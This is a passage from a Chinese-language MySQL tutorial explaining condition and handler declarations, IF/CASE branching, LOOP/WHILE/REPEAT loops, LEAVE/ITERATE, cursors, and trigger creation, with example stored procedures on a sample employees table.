<h4 id="定义条件"><a href="#定义条件" class="headerlink" title="定义条件"></a>定义条件</h4><p>定义条件就是给MySQL中的错误码命名，这有助于存储的程序代码更清晰。它将一个<code>错误名字</code>和<code>指定的错误条件</code>关联起来。这个名字可以随后被用在定义处理程序的<code>DECLARE HANDLER</code>语句中</p>
<p>错误码的说明：<br><code>MySQL_error_code</code>和<code>sqlstate_value</code>都可以表示MySQL的错误。</p>
<ul>
<li><code>MySQL_error_code</code>是数值类型错误代码。</li>
<li><code>sqlstate_value</code>是长度为5的字符串类型错误代码。<br>例如，在ERROR 1418 (HY000)中，1418是MySQL_error_code，’HY000’是sqlstate_value。</li>
</ul>
<p><strong>定义条件示例</strong>，使用<code>declare</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 使用MySQL_error_code</span></span><br><span class="line"><span class="keyword">DECLARE</span> Field_Not_Be_NULL <span class="keyword">CONDITION</span> <span class="keyword">FOR</span> <span class="number">1048</span>;</span><br><span class="line"><span class="comment">-- 使用sqlstate_value</span></span><br><span class="line"><span class="keyword">DECLARE</span> Field_Not_Be_NULL <span class="keyword">CONDITION</span> <span class="keyword">FOR</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;23000&#x27;</span>;</span><br></pre></td></tr></table></figure>


<h4 id="定义处理程序"><a href="#定义处理程序" class="headerlink" title="定义处理程序"></a>定义处理程序</h4><p><code>DECLARE 处理方式 HANDLER FOR 错误类型 处理语句</code></p>
<ul>
<li>处理方式：处理方式有3个取值：<code>CONTINUE、EXIT、UNDO</code>。<ul>
<li><code>CONTINUE</code>：表示遇到错误不处理，继续执行。主要在函数和过程中使用</li>
<li><code>EXIT</code>：表示遇到错误马上退出。</li>
<li><code>UNDO</code>：表示遇到错误后撤回之前的操作。MySQL中暂时不支持这样的操作。</li>
</ul>
</li>
<li>错误类型（即条件）可以有如下六种取值：<ul>
<li>针对单个错误<ul>
<li><code>SQLSTATE</code>‘字符串错误码’：表示长度为5的<code>sqlstate_value</code>类型的错误代码；</li>
<li><code>MySQL_error_code</code>：匹配数值类型错误代码；</li>
<li>错误名称：表示<code>DECLARE ... CONDITION</code>定义的错误条件名称。</li>
</ul>
</li>
<li>针对一类错误<ul>
<li><code>SQLWARNING</code>：匹配所有以01开头的<code>SQLSTATE</code>错误代码；</li>
<li><code>NOT FOUND</code>：匹配所有以02开头的<code>SQLSTATE</code>错误代码；</li>
<li><code>SQLEXCEPTION</code>：匹配所有没有被<code>SQLWARNING</code>或<code>NOT FOUND</code>捕获的SQLSTATE错误代码；</li>
</ul>
</li>
</ul>
</li>
<li>处理语句：如果出现上述条件之一，则采用对应的处理方式，并执行指定的处理语句。语句可以是像<code>SET 变量 = 值</code>这样的简单语句，也可以是使用<code>BEGIN ... END</code>编写的复合语句。</li>
</ul>
<p><strong>定义处理程序</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 法1：捕获sqlstate_value</span></span><br><span class="line"><span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;42S02&#x27;</span> <span class="keyword">SET</span> <span class="variable">@info</span> <span class="operator">=</span> <span class="string">&#x27;NO_SUCH_TABLE&#x27;</span>;</span><br><span class="line"><span class="comment">-- 法2：捕获mysql_error_value</span></span><br><span class="line"><span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="number">1146</span> <span class="keyword">SET</span> <span class="variable">@info</span> <span class="operator">=</span> <span class="string">&#x27;NO_SUCH_TABLE&#x27;</span>;</span><br><span class="line"><span class="comment">-- 法3：先定义条件，再调用</span></span><br><span class="line"><span class="keyword">DECLARE</span> no_such_table <span class="keyword">CONDITION</span> <span class="keyword">FOR</span> <span class="number">1146</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> NO_SUCH_TABLE <span class="keyword">SET</span> <span class="variable">@info</span> <span class="operator">=</span> <span class="string">&#x27;NO_SUCH_TABLE&#x27;</span>;</span><br><span class="line"><span class="comment">-- 法4：使用SQLWARNING</span></span><br><span class="line"><span class="keyword">DECLARE</span> EXIT HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLWARNING</span> <span class="keyword">SET</span> <span class="variable">@info</span> <span class="operator">=</span> <span class="string">&#x27;ERROR&#x27;</span>;</span><br><span class="line"><span class="comment">-- 法5：使用NOT FOUND</span></span><br><span class="line"><span class="keyword">DECLARE</span> EXIT HANDLER <span class="keyword">FOR</span> <span class="keyword">NOT</span> FOUND <span class="keyword">SET</span> <span class="variable">@info</span> <span class="operator">=</span> <span class="string">&#x27;NO_SUCH_TABLE&#x27;</span>;</span><br><span class="line"><span class="comment">-- 法6：使用SQLEXCEPTION</span></span><br><span class="line"><span class="keyword">DECLARE</span> EXIT HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLEXCEPTION</span> <span class="keyword">SET</span> <span class="variable">@info</span> <span class="operator">=</span> <span class="string">&#x27;ERROR&#x27;</span></span><br></pre></td></tr></table></figure>

<p>示例-针对存储过程使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> UpdateDataNoCondition()</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">      <span class="comment">-- 定义处理程序</span></span><br><span class="line">      <span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="number">1048</span> <span class="keyword">SET</span> <span class="variable">@proc_value</span> <span class="operator">=</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">SET</span> <span class="variable">@x</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> email <span class="operator">=</span> <span class="keyword">NULL</span> <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line">      <span class="keyword">SET</span> <span class="variable">@x</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> email <span class="operator">=</span> <span class="string">&#x27;aabbel&#x27;</span> <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Abel&#x27;</span>;</span><br><span class="line">      <span class="keyword">SET</span> <span class="variable">@x</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p>针对于MySQL的流程控制语句主要有 3 类。注意：<strong>（除case外）只能用于存储程序。</strong><br>存储程序：包括但不限于存储过程（Stored Procedures）、函数（Functions）、触发器（Triggers）和事件（Events）</p>
<ul>
<li>条件判断语句 ：IF 语句和 CASE 语句</li>
<li>循环语句 ：LOOP、WHILE 和 REPEAT 语句</li>
<li>跳转语句 ：ITERATE 和 LEAVE</li>
</ul>
<h4 id="分支结构之-IF"><a href="#分支结构之-IF" class="headerlink" title="分支结构之 IF"></a>分支结构之 IF</h4><p><code>IF</code> 语句只能在存储过程、函数、触发器和事件中使用，不能直接在普通的 SQL 查询中使用。</p>
<p>语法：<code>IF 表达式1 THEN 操作1 [ELSEIF 表达式2 THEN 操作2]…… [ELSE 操作N] END IF</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_by_eid3(<span class="keyword">IN</span> emp_id <span class="type">INT</span>)</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">      <span class="keyword">DECLARE</span> emp_salary <span class="keyword">DOUBLE</span>;</span><br><span class="line">      <span class="keyword">DECLARE</span> bonus <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">SELECT</span> salary <span class="keyword">INTO</span> emp_salary <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">      <span class="keyword">SELECT</span> commission_pct <span class="keyword">INTO</span> bonus <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line"></span><br><span class="line">      IF emp_salary <span class="operator">&lt;</span> <span class="number">9000</span></span><br><span class="line">         <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> <span class="number">9000</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">      ELSEIF emp_salary <span class="operator">&lt;</span> <span class="number">10000</span> <span class="keyword">AND</span> bonus <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line">         <span class="keyword">THEN</span> <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> commission_pct <span class="operator">=</span> <span class="number">0.01</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span>emp_id;</span><br><span class="line">      <span class="keyword">ELSE</span></span><br><span class="line">         <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">+</span> <span class="number">100</span> <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> emp_id;</span><br><span class="line">      <span class="keyword">END</span> IF;</span><br><span class="line">   <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<h4 id="分支结构之-CASE"><a href="#分支结构之-CASE" class="headerlink" title="分支结构之 CASE"></a>分支结构之 CASE</h4><p><code>CASE</code> 语句可以在 SQL 查询中使用，类似于其他数据库中的 <code>IF</code>，但只能出现在 <code>SELECT</code>、<code>WHERE</code>、<code>HAVING</code> 等 SQL 子句中。</p>
<p>语法：<br>情况一：类似于switch，针对值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> 表达式</span><br><span class="line"><span class="keyword">WHEN</span> 值<span class="number">1</span> <span class="keyword">THEN</span> 结果<span class="number">1</span>或语句<span class="number">1</span>(如果是语句，需要加分号)</span><br><span class="line"><span class="keyword">WHEN</span> 值<span class="number">2</span> <span class="keyword">THEN</span> 结果<span class="number">2</span>或语句<span class="number">2</span>(如果是语句，需要加分号)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">ELSE</span> 结果n或语句n(如果是语句，需要加分号)</span><br><span class="line"><span class="keyword">END</span> [<span class="keyword">case</span>]（如果是放在<span class="keyword">begin</span> <span class="keyword">end</span>中需要加上<span class="keyword">case</span>，如果放在<span class="keyword">select</span>后面不需要）</span><br></pre></td></tr></table></figure>
<p>情况二：类似于多重if，针对范围</p>
<p>**case语句的when子句中可以使用子查询，如：when id in （select id from employee where salary &gt; 10) **</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span></span><br><span class="line"><span class="keyword">WHEN</span> 条件<span class="number">1</span> <span class="keyword">THEN</span> 结果<span class="number">1</span>或语句<span class="number">1</span>(如果是语句，需要加分号)</span><br><span class="line"><span class="keyword">WHEN</span> 条件<span class="number">2</span> <span class="keyword">THEN</span> 结果<span class="number">2</span>或语句<span class="number">2</span>(如果是语句，需要加分号)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">ELSE</span> 结果n或语句n(如果是语句，需要加分号)</span><br><span class="line"><span class="keyword">END</span> [<span class="keyword">case</span>]（如果是放在<span class="keyword">begin</span> <span class="keyword">end</span>中需要加上<span class="keyword">case</span>，如果放在<span class="keyword">select</span>后面不需要`</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER $</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_by_eid3(<span class="keyword">IN</span> emp_id <span class="type">INT</span>)</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">      <span class="comment">-- 演示1</span></span><br><span class="line">      <span class="keyword">DECLARE</span> var <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">CASE</span> var</span><br><span class="line">         <span class="keyword">WHEN</span> <span class="number">1</span> <span class="keyword">THEN</span> <span class="keyword">SELECT</span> <span class="string">&#x27;var = 1&#x27;</span>;</span><br><span class="line">         <span class="keyword">WHEN</span> <span class="number">2</span> <span class="keyword">THEN</span> <span class="keyword">SELECT</span> <span class="string">&#x27;var = 2&#x27;</span>;</span><br><span class="line">         <span class="keyword">ELSE</span> <span class="keyword">SELECT</span> <span class="string">&#x27;var &gt; 2 &#x27;</span>;</span><br><span class="line">      <span class="keyword">END</span> <span class="keyword">CASE</span>;   </span><br><span class="line"><span class="keyword">END</span> $</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_by_eid4(<span class="keyword">IN</span> emp_id <span class="type">INT</span>)</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">   <span class="comment">-- 演示2</span></span><br><span class="line">      <span class="keyword">DECLARE</span> var1 <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">20</span>;</span><br><span class="line">      <span class="keyword">CASE</span> </span><br><span class="line">         <span class="keyword">WHEN</span> var1 <span class="operator">&gt;=</span> <span class="number">100</span> <span class="keyword">THEN</span> <span class="keyword">SELECT</span> <span class="string">&#x27;三位数&#x27;</span>;</span><br><span class="line">         <span class="keyword">WHEN</span> var1 <span class="operator">&gt;=</span> <span class="number">10</span> <span class="keyword">THEN</span> <span class="keyword">SELECT</span> <span class="string">&#x27;两位数&#x27;</span>;</span><br><span class="line">         <span class="keyword">ELSE</span> <span class="keyword">SELECT</span> <span class="string">&#x27;个位数&#x27;</span>;</span><br><span class="line">      <span class="keyword">END</span> <span class="keyword">CASE</span>;</span><br><span class="line"><span class="keyword">END</span> $</span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>





<h4 id="循环结构之-LOOP"><a href="#循环结构之-LOOP" class="headerlink" title="循环结构之 LOOP"></a>循环结构之 LOOP</h4><p>LOOP内的语句一直重复执行直到循环被退出，可以在循环内部使用 <code>LEAVE</code> 语句来中止循环。<br>语法：其中，loop_label表示LOOP语句的标注名称，每个 <code>LOOP</code> 必须有一个标签，用于在 <code>LEAVE</code> 语句中指定退出。（只有一个loop是或可省略）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[loop_label:] LOOP</span><br><span class="line">循环执行的语句</span><br><span class="line"><span class="keyword">END</span> LOOP [loop_label]</span><br></pre></td></tr></table></figure>

<p>示例代码：循环给大家涨薪，薪资涨为原来的1.1倍。直到全公司的平均薪资达到12000结束</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_loop(<span class="keyword">OUT</span> num <span class="type">INT</span>)</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">      <span class="keyword">DECLARE</span> avg_salary <span class="keyword">DOUBLE</span>;</span><br><span class="line">      <span class="keyword">DECLARE</span> loop_count <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> avg_salary <span class="keyword">FROM</span> employees;</span><br><span class="line">      label_loop:LOOP</span><br><span class="line">         IF avg_salary <span class="operator">&gt;=</span> <span class="number">12000</span> <span class="keyword">THEN</span> LEAVE label_loop;</span><br><span class="line">         <span class="keyword">END</span> IF;</span><br><span class="line">         <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">*</span> <span class="number">1.1</span>;</span><br><span class="line">         <span class="keyword">SET</span> loop_count <span class="operator">=</span> loop_count <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> avg_salary <span class="keyword">FROM</span> employees;</span><br><span class="line">      <span class="keyword">END</span> LOOP label_loop;</span><br><span class="line">      <span class="keyword">SET</span> num <span class="operator">=</span> loop_count;</span><br><span class="line">   <span class="keyword">END</span> $</span><br></pre></td></tr></table></figure>

<h4 id="循环结构之-WHILE"><a href="#循环结构之-WHILE" class="headerlink" title="循环结构之 WHILE"></a>循环结构之 WHILE</h4><p>WHILE在执行语句执行时，先对指定的表达式进行判断，如果为真，就执行循环内的语句，否则退出循环。（可以在循环内部使用 <code>LEAVE</code> 语句来中止循环。）<br>语法:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[while_label:] WHILE 循环条件 DO</span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">END</span> WHILE [while_label];</span><br></pre></td></tr></table></figure>

<p>示例：循环给大家降薪，薪资降为原来的90%。直到全公司的平均薪资达到5000结束</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_while(<span class="keyword">OUT</span> num <span class="type">INT</span>)</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">      <span class="keyword">DECLARE</span> avg_sal <span class="keyword">DOUBLE</span> ;</span><br><span class="line">      <span class="keyword">DECLARE</span> while_count <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> avg_sal <span class="keyword">FROM</span> employees;</span><br><span class="line">      WHILE avg_sal <span class="operator">&gt;</span> <span class="number">5000</span> DO</span><br><span class="line">         <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">*</span> <span class="number">0.9</span>;</span><br><span class="line">         <span class="keyword">SET</span> while_count <span class="operator">=</span> while_count <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> avg_sal <span class="keyword">FROM</span> employees;</span><br><span class="line">      <span class="keyword">END</span> WHILE;</span><br><span class="line">      <span class="keyword">SET</span> num <span class="operator">=</span> while_count;</span><br><span class="line">   <span class="keyword">END</span> $</span><br></pre></td></tr></table></figure>


<h4 id="循环结构之-REPEAT"><a href="#循环结构之-REPEAT" class="headerlink" title="循环结构之 REPEAT"></a>循环结构之 REPEAT</h4><p>类似do-while<br>REPEAT 循环首先会执行一次循环，然后在 UNTIL 中进行表达式的判断，如果满足条件就退出，即 END REPEAT；如果条件不满足，则会就继续执行循环，直到满足退出条件为止。<br>语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[repeat_label:] REPEAT</span><br><span class="line">循环体的语句</span><br><span class="line">UNTIL 结束循环的条件表达式</span><br><span class="line"><span class="keyword">END</span> REPEAT [repeat_label]</span><br></pre></td></tr></table></figure>

<p>示例：循环给大家涨薪，薪资涨为原来的1.15倍。直到全公司的平均薪资达到13000结束</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> update_salary_repeat(<span class="keyword">OUT</span> num <span class="type">INT</span>)</span><br><span class="line">   <span class="keyword">BEGIN</span></span><br><span class="line">      <span class="keyword">DECLARE</span> avg_sal <span class="keyword">DOUBLE</span> ;</span><br><span class="line">      <span class="keyword">DECLARE</span> repeat_count <span class="type">INT</span> DEFAULT1;</span><br><span class="line">      <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> avg_sal <span class="keyword">FROM</span> employees;</span><br><span class="line">      repeat_sal: REPEAT</span><br><span class="line">         <span class="keyword">UPDATE</span> employees <span class="keyword">SET</span> salary <span class="operator">=</span> salary <span class="operator">*</span> <span class="number">1.15</span>;</span><br><span class="line">         <span class="keyword">SET</span> repeat_count <span class="operator">=</span> repeat_count <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">INTO</span> avg_sal <span class="keyword">FROM</span> employees;</span><br><span class="line">         UNTIL avg_sal <span class="operator">&gt;=</span> <span class="number">13000</span>;</span><br><span class="line">      <span class="keyword">END</span> REPEAT repeat_sal;</span><br><span class="line">      <span class="keyword">SET</span> num <span class="operator">=</span> repeat_count;</span><br><span class="line">   <span class="keyword">END</span> $</span><br></pre></td></tr></table></figure>

<p><strong>三种循环结构对比</strong>：<br>1、这三种循环都可以省略名称，但如果循环中添加了循环控制语句（LEAVE或ITERATE）则必须添加名称。<br>2、 LOOP：一般用于实现简单的”死”循环 WHILE：先判断后执行 REPEAT：先执行后判断，无条件至少执行一次</p>
<h4 id="跳转语句之-LEAVE"><a href="#跳转语句之-LEAVE" class="headerlink" title="跳转语句之 LEAVE"></a>跳转语句之 LEAVE</h4><p>可以用在循环语句内，或者以 BEGIN 和 END 包裹起来的程序体内，表示跳出循环或者跳出程序体的操作,可以理解为 break。</p>
<p>语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LEAVE 标记名</span><br></pre></td></tr></table></figure>
<p>使用方法见上文LOOP部分</p>
<h4 id="跳转语句之-ITERATE"><a href="#跳转语句之-ITERATE" class="headerlink" title="跳转语句之 ITERATE"></a>跳转语句之 ITERATE</h4><p>只能用在循环语句（LOOP、REPEAT和WHILE语句）内，表示重新开始循环，将执行顺序转到语句段开头处，可以理解为 continue，意<br>思为“再次循环”。<br>语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ITERATE label</span><br></pre></td></tr></table></figure>

<h3 id="游标的使用"><a href="#游标的使用" class="headerlink" title="游标的使用"></a>游标的使用</h3><p>虽然我们也可以通过筛选条件 WHERE 和 HAVING，或者是限定返回记录的关键字 LIMIT 返回一条记录，但是，却无法在结果集中像指针一样，向前定位一条记录、向后定位一条记录，或者是 随意定位到某一条记录 ，并对记录的数据进行处理。这个时候，就可以用到游标。<br>游标提供了一种灵活的操作方式，让我们能够对结果集中的每一条记录进行定位，并对指向的记录中的数据进行操作的数据结构。游标让 SQL 这种面向集合的语言有了面向过程开发的能力。<br>在 SQL 中，游标是一种临时的数据库对象，可以指向存储在数据库表中的数据行指针。这里游标 充当了指针的作用 ，我们可以通过操作游标来对数据行进行操作。<br>MySQL中游标<code>可以在存储过程和函数中</code>使用。</p>
<p><strong>游标的使用步骤</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.游标的声明 </span></span><br><span class="line"><span class="comment">/*select_statement 代表的是 SELECT 语句，返回一个用于创建游标的结果集。*/</span></span><br><span class="line"><span class="comment">-- 在 MySQL，SQL Server，DB2 和 MariaDB</span></span><br><span class="line"><span class="keyword">DECLARE</span> cursor_name <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> select_statement;</span><br><span class="line"><span class="comment">-- 在 Oracle 或者 PostgreSQL</span></span><br><span class="line"><span class="keyword">DECLARE</span> cursor_name <span class="keyword">CURSOR</span> <span class="keyword">IS</span> select_statement;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.打开游标：定义后想要使用必须打开游标</span></span><br><span class="line"><span class="comment">/*打开游标的时候 SELECT 语句的查询结果集就会送到游标工作区，为后面游标的 逐条读取 结果集中的记录做准备。*/</span></span><br><span class="line"><span class="keyword">OPEN</span> cursor_name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 使用游标（从游标中取得数据）</span></span><br><span class="line"><span class="comment">/*如果游标读取的数据行有多个列名，则在 INTO 关键字后面赋值给多个变量名即可；游标的查询结果集中的字段数，必须跟 INTO 后面的变量数一致；var_name必须在声明游标之前就定义好*/</span></span><br><span class="line"><span class="keyword">FETCH</span> cursor_name <span class="keyword">INTO</span> var_name [, var_name] ...</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4.关闭游标，避免资源浪费</span></span><br><span class="line"><span class="comment">/*使用完游标后需要关闭掉该游标。因为游标会占用系统资源 ，如果不及时关闭，游标会一直保持到存储过程结束，影响系统运行的效率。*/</span></span><br><span class="line"><span class="keyword">CLOSE</span> cursor_name</span><br></pre></td></tr></table></figure>

<p>使用实例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> get_count_by_limit_total_salary(<span class="keyword">IN</span> l_t_salary <span class="type">DECIMAL</span>,<span class="keyword">OUT</span> t_count <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">DECLARE</span> sum_sal <span class="keyword">DOUBLE</span> <span class="keyword">DEFAULT</span> <span class="number">0.0</span>; <span class="comment">-- 先声明局部变量</span></span><br><span class="line">   <span class="keyword">DECLARE</span> emp_sal <span class="keyword">DOUBLE</span>;</span><br><span class="line">   <span class="keyword">DECLARE</span> emp_count <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line">   <span class="comment">-- 声明</span></span><br><span class="line">   <span class="keyword">DECLARE</span> emp_cu <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> <span class="keyword">SELECT</span> salary <span class="keyword">FROM</span> employee <span class="keyword">ORDER</span> <span class="keyword">BY</span> salary <span class="keyword">DESC</span>;</span><br><span class="line">   <span class="comment">-- 打开</span></span><br><span class="line">   <span class="keyword">OPEN</span> emp_cu;</span><br><span class="line">   REPEAT</span><br><span class="line">      <span class="comment">--使用</span></span><br><span class="line">      <span class="keyword">FETCH</span> emp_cu <span class="keyword">INTO</span> emp_sal;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">SET</span> sum_sal <span class="operator">=</span> sum_sal <span class="operator">+</span> emp_sal;</span><br><span class="line">      <span class="keyword">SET</span> emp_count <span class="operator">=</span> emp_count <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">      UNTIL sum_sal <span class="operator">&gt;=</span> l_t_salary;</span><br><span class="line">   <span class="keyword">END</span> REPEAT;</span><br><span class="line">   <span class="keyword">SET</span> t_count <span class="operator">=</span> emp_count;</span><br><span class="line">   <span class="comment">--关闭</span></span><br><span class="line">   <span class="keyword">CLOSE</span> emp_cu;</span><br><span class="line"><span class="keyword">END</span> $</span><br></pre></td></tr></table></figure>


<p>游标的优点和不足</p>
<ol>
<li>为 逐条读取 结果集中的数据，提供了完美的解决方案。</li>
<li>在使用游标的过程中，会对数据行进行 加锁 ，这样在业务并发量大的时候，不仅会影响业务之间的效率，还会 消耗系统资源 ，造成内存不足</li>
</ol>
<h2 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h2><p>触发器是由<code>事件来触发</code>某个操作，这些事件包括<code>INSERT</code>、<code>UPDATE</code>、<code>DELETE</code>事件。所谓事件就是指用户的动作或者触发某项行为。如果定义了触发程序，当数据库执行这些语句时候，就相当于事件发生了，就会<code>自动</code>激发触发器执行相应的操作。<br>当对数据表中的数据执行插入、更新和删除操作，需要自动执行一些数据库逻辑时，可以使用触发器来实现。<br><strong>触发器是针对某一特定的表的特定操作的</strong></p>
<h3 id="触发器的创建"><a href="#触发器的创建" class="headerlink" title="触发器的创建"></a>触发器的创建</h3><p>语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器名称</span><br><span class="line">&#123;BEFORE<span class="operator">|</span>AFTER&#125; &#123;<span class="keyword">INSERT</span><span class="operator">|</span><span class="keyword">UPDATE</span><span class="operator">|</span><span class="keyword">DELETE</span>&#125; <span class="keyword">ON</span> 表名</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line">触发器执行的语句块;</span><br></pre></td></tr></table></figure>

<p><strong>格式说明：</strong></p>
<ol>
<li>表名：表示触发器监控的对象。</li>
<li>BEFORE|AFTER：表示触发的时间。<code>BEFORE</code>表示在事件之前触发；<code>AFTER</code>表示在事件之后触发。</li>
<li>INSERT|UPDATE|DELETE ：表示触发的事件。<ul>
<li>INSERT 表示插入记录时触发；</li>
<li>UPDATE 表示更新记录时触发；</li>
<li>DELETE 表示删除记录时触发。</li>
</ul>
</li>
<li>触发器执行的语句块：可以是单条SQL语句，也可以是由BEGIN…END结构组成的复合语句块</li>
</ol>
<p>示例：创建名称为before_insert的触发器，向test_trigger数据表插入数据之前，向test_trigger_log数据表中插入before_insert的日志信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> before_insert</span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">ON</span> test_trigger</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_trigger_log(t_log) <span class="keyword">values</span>(<span class="string">&#x27;before_insert&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>在插入操作触发器中可以用new表示新插入的数据；在删除操作触发器中可以用old表示刚删除的数据</strong><br>同一表同一操作可以绑定多个触发器，均会执行。</p>
<h3 id="查看和删除触发器"><a href="#查看和删除触发器" class="headerlink" title="查看和删除触发器"></a>查看和删除触发器</h3><p>查看触发器是查看数据库中已经存在的触发器的定义、状态和语法信息等。</p>
